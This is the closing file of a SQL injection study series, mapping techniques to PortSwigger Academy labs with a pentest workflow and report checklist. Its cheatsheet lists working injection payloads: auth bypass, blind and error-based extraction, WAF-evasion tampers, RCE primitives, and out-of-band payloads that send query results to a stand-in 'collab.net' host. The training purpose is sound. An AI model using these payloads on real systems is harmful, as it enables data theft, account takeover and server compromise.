# Final Cheatsheet & PortSwigger Lab Progression Map

## 1. Quick-Reference Payload Cheatsheet

### 1.1 Detection
| Goal | Payload | Mechanism Reference |
|---|---|---|
| Confirm injection | `'`, `"`, `' OR '1'='1`, `' AND '1'='2` | File 01 §1, File 03 §2.2 |
| Confirm column count | `' ORDER BY N--` (increment N) | File 02 §1.2 |
| Confirm reflected columns | `' UNION SELECT 'a','b'--` | File 02 §1.3 |

### 1.2 Fingerprinting
| DBMS | Version Query |
|---|---|
| MySQL/MariaDB | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MSSQL | `SELECT @@version` |
| Oracle | `SELECT banner FROM v$version` |

### 1.3 Extraction By Technique
| Technique | Core Payload Pattern | File |
|---|---|---|
| UNION-based | `' UNION SELECT col1,col2 FROM table--` | 02 |
| Error-based (MySQL) | `' AND extractvalue(1,concat(0x7e,(subquery)))--` | 02 |
| Boolean-blind | `' AND SUBSTRING((subquery),N,1)='x'--` | 03 |
| Time-blind (MySQL) | `' AND IF((cond),SLEEP(5),0)--` | 03 |
| OOB (Oracle) | `UTL_INADDR.get_host_address((subquery)\|\|'.collab.net')` | 04 |
| OOB (MSSQL) | `EXEC master..xp_dirtree '\\\\'+(subquery)+'.collab.net\share'` | 04 |

### 1.4 Auth Bypass
| Payload | Mechanism |
|---|---|
| `' OR '1'='1` | Tautology |
| `admin'--` | Comment-out password check |
| `' UNION SELECT 'admin','hash'--` | Fabricated result row |

### 1.5 WAF Bypass Quick Picks
| Block Type | Try First |
|---|---|
| Keyword-space adjacency | `space2comment` tamper / `/**/` inline |
| Case-sensitive regex | `randomcase` tamper |
| Quote character blocked | Hex encoding (`0x...`) / `apostrophemask` |
| Generic signature WAF (ModSecurity CRS) | `modsecurityversioned` tamper |
| Rate-limiting | `--delay`, `--randomize`, `--random-agent` |

### 1.6 RCE Primitives
| DBMS | Primitive | Privilege |
|---|---|---|
| MySQL | `INTO OUTFILE` | `FILE` |
| MSSQL | `xp_cmdshell` | `sysadmin` |
| PostgreSQL | `COPY ... TO PROGRAM` | Superuser |

## 2. PortSwigger Web Security Academy — Full Lab Progression Map

This maps each technique covered across files 01–08 to its corresponding Academy lab(s), in
the order they appear in the Academy's own difficulty progression (Apprentice → Practitioner
→ Expert) within the **SQL injection** topic.

### Apprentice
1. **SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**
   → File 01 (core mechanism), File 02 §1 (foundation for UNION extension)
2. **SQL injection vulnerability allowing login bypass**
   → File 08 §4 (auth bypass cheatsheet)
3. **SQL injection attack, querying the database type and version on Oracle**
   → File 01 §4, File 02 §2.4
4. **SQL injection attack, querying the database type and version on MySQL and Microsoft**
   → File 01 §4, File 02 §2.1–2.2
5. **SQL injection attack, listing the database contents on non-Oracle databases**
   → File 02 §1.5 (`information_schema` enumeration)
6. **SQL injection attack, listing the database contents on Oracle**
   → File 02 §1.5 adapted (`all_tables`/`dual` per File 01 §4, File 02 §2.4)
7. **SQL injection UNION attack, determining the number of columns returned by the query**
   → File 02 §1.2
8. **SQL injection UNION attack, finding a column containing text**
   → File 02 §1.3
9. **SQL injection UNION attack, retrieving data from other tables**
   → File 02 §1.4–1.5
10. **SQL injection UNION attack, retrieving multiple values in a single column**
    → File 02 §1.6 (`GROUP_CONCAT`)

### Practitioner
11. **Blind SQL injection with conditional responses**
    → File 03 §2
12. **Blind SQL injection with conditional errors**
    → File 03 §3
13. **Blind SQL injection with time delays**
    → File 03 §4
14. **Blind SQL injection with time delays and information retrieval**
    → File 03 §4.2 (character extraction variant)
15. **Blind SQL injection with out-of-band interaction**
    → File 04 (full file — DNS/HTTP OOB)
16. **Blind SQL injection with out-of-band data exfiltration**
    → File 04 §3–§4 (data-carrying subdomain/UNC payloads)
17. **SQL injection with filter bypass via XML encoding**
    → File 06 §5 (encoding tricks), File 06 §8 (combined chains)
18. **SQL injection vulnerability in the ORDER BY clause**
    → File 08 §5.1

### Expert
19. **Visible error-based SQL injection**
    → File 02 §2 (full error-based section)
20. **SQL injection with filter bypass via XML encoding** *(if presented at Expert tier in
    current Academy revision)*
    → File 06 (full manual bypass file)

> Note: PortSwigger periodically reorganizes lab names/tiers between Academy revisions —
> always cross-check against the live Academy topic page for the current exact list and
> ordering; this mapping reflects the standard, stable lab set and progression logic that has
> remained consistent across revisions, but exact lab counts/tier placement can shift.

## 3. Engagement Workflow Summary (Tie-Together)

1. **Recon** — identify all input surfaces: URL params, POST body, headers, cookies (File 08
   §5.3), JSON body fields.
2. **Confirm injection** — manual quote/tautology tests (File 01 §1, File 03 §2.2).
3. **Fingerprint DBMS** — File 01 §4.
4. **Choose technique** — in-band if errors/UNION work (File 02), else blind (File 03), else
   OOB if outbound access exists (File 04).
5. **Check for second-order sinks** — trace stored input to downstream queries (File 05).
6. **Test WAF presence/bypass** — `--identify-waf`, manual encoding (File 06, File 07 §7).
7. **Automate extraction** — sqlmap with confirmed technique/tamper (File 07).
8. **Assess escalation potential** — stacked queries, file I/O, RCE chain (File 08 §1–§3).
9. **Document** — exact payload, request/response evidence, business impact framing (Real-
   World Notes sections throughout).

## 4. Report-Writing Master Checklist

- [ ] Exact vulnerable parameter, HTTP method, and full request/response PoC included
- [ ] DBMS type/version identified and stated
- [ ] Technique used (UNION/blind/OOB/second-order) explicitly named
- [ ] Business impact stated in non-technical terms (data exposed, access gained)
- [ ] If WAF was present: bypass method documented as a secondary finding
- [ ] If RCE/file-write was achieved: explicitly called out with privilege level required
- [ ] Remediation recommendation: parameterized queries/prepared statements as the primary
  fix — never "block this specific payload" as a standalone recommendation
- [ ] Exact sqlmap command line (if used) included in technical appendix for reproducibility

## 5. End Of Series

This completes the SQL Injection note series. Refer back to `README.md` for the full file
index and recommended reading order.
